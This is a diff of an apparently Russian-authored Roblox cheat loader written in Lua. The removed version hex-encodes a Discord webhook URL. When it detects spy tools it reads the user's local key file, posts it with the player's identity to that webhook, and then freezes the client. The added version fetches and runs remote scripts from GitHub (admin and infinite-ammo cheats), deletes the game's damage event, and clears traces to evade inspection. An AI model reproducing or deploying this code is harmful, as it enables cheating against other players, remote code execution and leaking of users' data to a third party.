@@ -1,74 +1,110 @@
-local function _D(h)
-    local s = ""
-    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
-    return s
-end
+-- =============================================================
+--  ФАКТОР 3/3: ОСНОВНОЙ ЛОАДЕР (ЗАГРУЗЧИК)
+--  ССЫЛКА: https://raw.githubusercontent.com/itseasyrpg/test_http/refs/heads/main/rpg.lua
+-- =============================================================
+return function(SEC_STATE)
+    local _ORIG = SEC_STATE.ORIG
+    local _L = SEC_STATE.PLAYER
+    local _H = SEC_STATE.HTTP
+    local _TS = SEC_STATE.TS
+    local _CG = SEC_STATE.CG
+    local _UIS = SEC_STATE.UIS
+    local _RS = game:GetService("ReplicatedStorage")
+    local _st = SEC_STATE.STATUS
+    local _hw = SEC_STATE.HWID
+    local _tk = SEC_STATE.KEY
+    local _uid = tostring(_L.UserId)
 
-local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-local _L = game:GetService("Players").LocalPlayer
-local _H = game:GetService("HttpService")
+    -- =============================================================
+    --  АУТЕНТИФИКАЦИЯ И ТОКЕНЫ (КАК БЫЛО В ОРИГИНАЛЕ)
+    -- =============================================================
+    local _storage = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
+    _storage.Name = "__NK_RUNTIME"
+    local _phys_auth = _storage:FindFirstChild(_L.Name) or Instance.new("StringValue", _storage)
+    _phys_auth.Name = _L.Name
+    _phys_auth.Value = "V8_SECURE_TOKEN_VALID"
 
-local function _SC()
-    if not _req then return false end
-    local ok, info = pcall(debug.getinfo, _req)
-    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
-    local ok2, info2 = pcall(debug.getinfo, game.HttpGet)
-    if ok2 and info2 and info2.source ~= "=[C]" then return "HOOKED_HTTPGET" end
-    
-    local cg = game:GetService("CoreGui")
-    local env = getgenv()
-    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
-        if cg:FindFirstChild(n) or env[n] then return "SPY_FOUND_" .. n end
+    -- ЕСЛИ БЛЭКЛИСТ — КИК
+    if _st == "blacklist" then
+        _L:Kick("Banned.")
+        return
     end
-    
-    local mt = getrawmetatable(game)
-    if mt and mt.__namecall then
-        local ok3, info3 = pcall(debug.getinfo, mt.__namecall)
-        if ok3 and info3 and info3.source:lower():find("spy") then return "NAMECALL_HOOK" end
-    end
-    
-    return false
-end
 
-local _se = _SC()
-if _se then
-    local _A = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
-    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
-    pcall(function()
-        _req({
-            Url = _A, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = _H:JSONEncode({
-                embeds = {{
-                    title = "Security Alert: Advanced Interceptor Detected",
-                    color = 16711680,
-                    fields = {
-                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
-                        {name = "Detection", value = tostring(_se), inline = true},
-                        {name = "Device Key", value = "```" .. tk .. "```", inline = false}
-                    }
-                }}
-            })
-        })
+    -- =============================================================
+    --  ПЕРЕТАЩЕННЫЕ ФУНКЦИИ ИЗ СТАРОГО ЗАГРУЗЧИКА (БЕЗ ОБРЕЗОК)
+    -- =============================================================
+
+    -- DRAGGABLE GUI ПАНЕЛЬ УПРАВЛЕНИЯ ДЛЯ ВАЙТЛИСТА
+    if _st == "whitelist" then
+        _ORIG.task_spawn(function()
+            local sg = Instance.new("ScreenGui", (gethui and gethui()) or _CG)
+            local f = Instance.new("Frame", sg)
+            f.Size = UDim2.new(0, 200, 0, 300)
+            f.Position = UDim2.new(0.5,-100,0.5,-150)
+            f.BackgroundColor3 = Color3.fromRGB(30,30,35)
+            f.Visible = false
+            f.Active = true
+            f.Draggable = true
+            Instance.new("UICorner", f)
+
+            local s = Instance.new("ScrollingFrame", f)
+            s.Size = UDim2.new(1,-10,1,-20)
+            s.Position = UDim2.new(0,5,0,10)
+            s.BackgroundTransparency = 1
+            Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
+
+            local function refresh()
+                for _, v in _ORIG.t_ipairs(s:GetChildren()) do
+                    if v:IsA("TextButton") then v:Destroy() end
+                end
+                for _, pObj in _ORIG.t_ipairs(_storage:GetChildren()) do
+                    local b = Instance.new("TextButton", s)
+                    b.Size = UDim2.new(1, 0, 0, 30)
+                    b.Text = pObj.Name
+                    b.TextColor3 = Color3.new(1,1,1)
+                    b.BackgroundColor3 = Color3.fromRGB(45,45,50)
+                    b.MouseButton1Click:Connect(function()
+                        pObj.Value = "kick"
+                    end)
+                end
+            end
+
+            _UIS.InputBegan:Connect(function(k, g)
+                if not g and k.KeyCode == Enum.KeyCode.Insert then
+                    f.Visible = not f.Visible
+                    refresh()
+                end
+            end)
+        end)
+    end
+
+    _phys_auth.Changed:Connect(function(v)
+        if v == "kick" then _L:Kick("Access Revoked.") end
     end)
-    _L:Kick("Security Tamper Detected. Session Blocked.")
-    while true do end return
-end
 
-local _TS = game:GetService("TestService")
-local _ST = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
-_ST.Name = "__NK_RUNTIME"
-local _AU = Instance.new("StringValue", _ST)
-_AU.Name = _L.Name
-_AU.Value = "V8_SECURE_AUTH"
-shared._NK_AUTH = "V8_SECURE_AUTH"
+    -- ЗАГРУЗКА ВСЕХ СКРИПТОВ ЧЕРЕЗ СОХРАНЁННЫЙ ОРИГИНАЛ
+    local function safeLoad(url)
+        _ORIG.pcall(function()
+            local res = _ORIG.httpget(game, url)
+            if res then
+                local fn = _ORIG.load(res, url)
+                if fn then _ORIG.task_spawn(fn) end
+            end
+        end)
+    end
 
--- ИСПРАВЛЕННАЯ ССЫЛКА (без буквы 'a')
-local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F746573745F687474702F726566732F68656164732F6D61696E2F7270672E6C7561")
-local ok, res = pcall(function() return game:HttpGet(_G) end)
-if ok and res then
-    local f = loadstring(res)
-    if f then task.spawn(f) end
-else
-    _L:Kick("Error 0x82: Connection failed")
+    safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
+    safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
+    safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+    safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
+
+    _ORIG.pcall(function()
+        if _RS:FindFirstChild("ACS_Engine") then
+            _RS.ACS_Engine.Events.FDMG:Destroy()
+        end
+    end)
+
+    -- ЧИСТИМ СЛЕДЫ ЧТОБЫ СПАИ НЕ НАШЛИ СЕКТОР СОСТОЯНИЯ
+    _ORIG.task_wait(2)
+    _ORIG.pcall(function() shared.__NK_3F_SEC = nil end)
 end
